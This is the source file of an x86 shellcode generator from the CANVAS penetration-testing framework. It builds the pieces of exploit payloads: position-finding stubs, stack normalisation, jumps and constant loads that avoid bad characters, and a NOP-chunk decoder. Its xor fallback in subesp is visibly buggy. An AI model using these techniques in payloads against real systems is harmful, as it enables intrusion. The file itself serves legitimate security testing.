#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
X86 shellcode generator
"""

import random
import sys
if "." not in sys.path:
    sys.path.append(".")
from exploitutils import *
from MOSDEF import mosdef
from mosdef_shellcodeGenerator import shellcodeGenerator, shellfunc

class X86(shellcodeGenerator):
    def __init__(self):
        shellcodeGenerator.__init__(self)
        self.findeipcode=""
        self.handlers["Normalize Stack"]=self.handle_normalizestack
        self.handlers["Jump"]=self.handle_jump
        self.handlers["findeip"]=self.findeip
        self.handlers["debugme"]=self.debugme
        self.handlers["CreateThreadFindeip"]=self.CreateThreadFindeip
        self.handlers["one_chunkize"]=self.one_chunkize
        self.handlers["addesp"]=self.addesp
        self.handlers["subesp"]=self.subesp
        self.handlers["findeipnoesp"]=self.FindEIPNoESP
        self.arch="X86"
        self.code=""
        self.normalizedstack=0

    def whileone(self, args):
        code="""
        jmp $-2
        """
        bin=mosdef.assemble(code,"X86")
        self.value+=bin
        return bin
    
        
    def load_long(self,register,long,badstring):
        """
        Tries to load a long into a register avoiding a badstring
        Optimizes slightly in the case that you can do it right away...
        """
        code="movl $0x%8.8x, %s\n"%(uint32(long),register)
        bin=mosdef.assemble(code,"X86")
        worked=1
        for c in badstring:
            #print "looking for %2.2x in string"%ord(c)
            if c in bin:
                #print "Found %2.2x in string"%ord(c)
                worked=0
        if worked:
            return code
        #print "Trivial case did not work"

        #now try a mov into eax and an add/subtract
        #tryvals=[0x41414141,0xffffffff,0x54545454]
        for i in range(1,50):
            guess=random.randint(0,sys.maxint-1)
            if random.randint(0,2)==1:
                guess=int(-guess)
            v=guess
            #print "Trying: 0x%8.8x"%uint32(v)
            code="movl $0x%8.8x, %s\n"%(uint32(v),register)
            addval=long-v
            code+="addl $0x%8.8x,%s\n"%(uint32(addval),register)
            bin=mosdef.assemble(code,"X86")
            worked=1
            #print "Looking in %s"%prettyprint(bin)
            for c in badstring:
                #print "looking for %2.2x in string"%ord(c)
                if c in bin:
                    #print "Rejected: Found %2.2x in string. Generating new string."%ord(c)
                    worked=0
            if worked:
                return code
        #print "load_long failed..."
        return ""
            
    def handle_jump(self,args):
        """From time to time you may want to jump fowards or backwards
        without knowing any registers, and with a tight badstring."""
        if args==None:
            print "Error - no args passed to jump!"
            return ""
        #an integer that can be negative
        jmpvalue=args["jmpvalue"]
        badstring=args["badstring"]
        #first try to make a normal jmp
        code="jmp $0x%8.8x\n"%uint32(jmpvalue)
        #print "Assembling: %s"%code
        bin=mosdef.assemble(code,"X86")
        worked=1
        for c in badstring:
            if c in bin:
                worked=0
        if worked:
            self.value+=bin
            return bin

        #now try non-trivial case where we do other stuff to get a long in there
        start=self.load_long("%eax",jmpvalue,badstring)
        #print "Start = %s"%prettyprint(start)
        if start=="":
            self.value+=""
            return ""
        code="""
        jmp forward
back:
        pop %ebx
        addl %ebx, %eax
        jmp *%eax
forward:
        call back
        """
        bin=mosdef.assemble(code,"X86")
        bin=start+bin
        #print prettyprint(bin)
        worked=1
        for c in badstring:
            if c in bin:
                worked=0
        if worked:
            self.value+=bin
            return bin
        #print "Failed"
        self.value+=""
        return ""

    def handle_normalizestack(self,args):
        if args!=None:
            subespval=args[0]
        else:
            #default is 0x0 (no adjustment)
            subespval=0x0
        self.normalizeStack(subespval)
        return
            
    def normalizeStack(self,subespval):
        """Includes code that normalizes an X86 stack
        Takes in one argument in case you need your shellcode to adjust esp before
        performing the first call
        destroys %esi
        """
        code="""
normalizeespandebp:
        """
        if subespval!= 0:
            code+="""
        subl $SUBESPVAL,%esp
            """
        code+="""

        movl %esp,%ebp
        addl $0xf0,%ebp

donenormalize:
        """
        code=code.replace("SUBESPVAL","%d"%subespval)
        self.code+=code
        self.normalizedstack=1
        return 
    
    def debugme(self,args):
        self.value+="\xcc" #add int 3 to shellcode
        
    def findeip(self,args):
        #print "FINDEIP, YO"
        code="""
normalizeespandebp:
        """
        if args!=None and "subespval" in args:
            subespval=args["subespval"]
        else:
            subespval=0
            
        if subespval!= 0:
            code+="""
        sub $SUBESPVAL,%esp
            """
        code+="""
        call geteip
geteip:
        pop %ebx
        //ebx now has our base!
        movl %ebx,%esp
        //word align it for socket calls (stupid win32)
        and  $0xfffffff0,%esp
        subl $0x1000,%esp
        //esp is now a nice value
        mov    %esp,%ebp
        //ebp is now a nice value too! :>
donenormalize:
        //.byte 0xcc
        """
        # Added to be able to save a socket reg on 2 stage opcode
        # noticably with win32 GOcode and win32RecvExec
        if args != None and "savereg" in args:
            register = args["savereg"]
            register = register.replace("%", "")
            code += """
                    savereg:
                        pushl %SAVEME
            """
            if register=="ebx":
                print "WARNING: Saving ebx is not supported!"
            code = code.replace("SAVEME", register)

        self.findeipcode=code.replace("SUBESPVAL","%d"%subespval)
        self.foundeip=1
        return
    
    def FindEIPNoESP(self,args):
        #print "FindEIPNoESP"
        if args!=None and "subespval" in args:
            subespval=args["subespval"]
        else:
            subespval=0
            
        code=""
            
        if args != None and "savereg" in args and args["savereg"]=="createthread":
            #print "Using savereg==createthread code"
            code+="""
            //.byte 0xcc
            movl 4(%esp), %esi
            """
            
        code+="""
        normalizeespandebp:
        """
        if subespval!= 0:
            code+="""
        sub $SUBESPVAL,%esp
            """
        code+="""
        call geteip
        geteip:
            popl %ebx
        donenormalize:
            //.byte 0xcc
        """
        # Added to be able to save a socket reg on 2 stage opcode
        # noticably with win32 GOcode and win32RecvExec
        if args != None and "savereg" in args:
            if args["savereg"]=="createthread":
                register="esi"
            else:
                register = args["savereg"]
            register = register.replace("%", "")
            code += """
            savereg:
                pushl %SAVEME
            """
            code = code.replace("SAVEME", register)
            
        self.findeipcode=code.replace("SUBESPVAL","%d"%subespval)
        self.foundeip=1
        return

    # when we use createthread (like with ASN.1)
    # we need to make sure we keep using our existing
    # stackpointer, made this a seperate attribute
    # in case we ever decide we want to do more for this
    def CreateThreadFindeip(self,args):
        #print "CreateThreadFindeip"
        code="""
        normalizeespandebp:
        """
        if args!=None and "subespval" in args:
            subespval=args["subespval"]
        else:
            subespval=0

        if args != None and "savereg" in args and args["savereg"]=="createthread":
            code+="""
            movl (%ebp), %esi
            """

        if subespval!= 0:
            code+="""
        sub $SUBESPVAL,%esp
            """
        code+="""
        call geteip
        geteip:
            popl %ebx
            //movl %ebx,%esp
            //ebx now has our base!
            //word align it for socket calls (stupid win32)
            and  $0xfffffff0,%esp
            subl $0x1000,%esp
            //esp is now a nice value
            mov    %esp,%ebp
            //ebp is now a nice value too! :>
        donenormalize:
            //.byte 0xcc
        """
        # Added to be able to save a socket reg on 2 stage opcode
        # noticably with win32 GOcode and win32RecvExec
        if args != None and "savereg" in args:
            #print "args=%s"%args
            if args["savereg"]=="createthread":
                register="esi"
            else:
                register = args["savereg"]
            #print "register=%s"%register
            register = register.replace("%", "")
            code += """
            savereg:
                pushl %SAVEME
            """
            code = code.replace("SAVEME", register)
            
        self.findeipcode=code.replace("SUBESPVAL","%d"%subespval)
        self.foundeip=1
        return

    def subesp(self,args):
        size=args[0]
        if len(args)>1:
            badstring=args[1]
        else:
            badstring=""

        prepre="add $-%s,%%esp\n"%(hex(size))
        if hasbadchar(mosdef.assemble(prepre,"X86"),badstring):
                #print "Using subl"
                prepre="subl $%s,%%esp\n"%hex(size)
                if hasbadchar(mosdef.assemble(prepre,"X86"),badstring):
                        #print "Using xor"
                        prepre=0
                        xorkey=0x41424344 #ABCD!
                        prepre+="movl $0x%8.8x, %%eax\n"%xorkey
                        prepre+="xorl $0x%8.8x, %%eax\n"%uint32(size^xorkey)
                        prepre+="subl %eax, %esp\n"

        self.code+=prepre
        return
    
        
    def addesp(self,args):
        size=args[0]
        #print "Adding %d to esp"%size
        code="addl $SIZE,%esp\n".replace("SIZE","%s"%size)
        self.code+=code
        #print "Code=%s"%code
        return
    
    def one_chunkize(self,args):
        """
        Insert some nops into a certain space 
        <partA><chunkofnops><partB>
        This decoder will remove those nops
        """
        
        chunkloc=args["chunkloc"]
        chunksize=args["chunksize"]
        shellsize=args["shellsize"]-chunkloc #-chunksize #size of part B
        
        badstring=args["badstring"]
        #stack must already be clean and ready to use
        code="""
        jmp bottom
        geteip:
            pop %edi
            //eip is now  in edi
            """
        code+=self.load_long("%eax",chunkloc,badstring)
        code+="""
            addl %eax, %edi
            movl %edi,%esi
            """
        code+=self.load_long("%eax",chunksize,badstring)	
        code+="""
            addl %eax, %esi
            """
        code+=self.load_long("%ecx",shellsize,badstring)	
        code+="""
            mymovebyte:
                movb (%esi),%al
                movb %al, (%edi)
                inc %edi
                inc %esi
            loop mymovebyte
            jmp endonechunk
        bottom:
            call geteip
        endonechunk:
        """
        code=code.replace("CHUNKLOC","%s"%chunkloc)
        code=code.replace("CHUNKSIZE","%s"%chunksize)
        self.code+=code
        self.foundeip=1
        return code
        #END CLASS
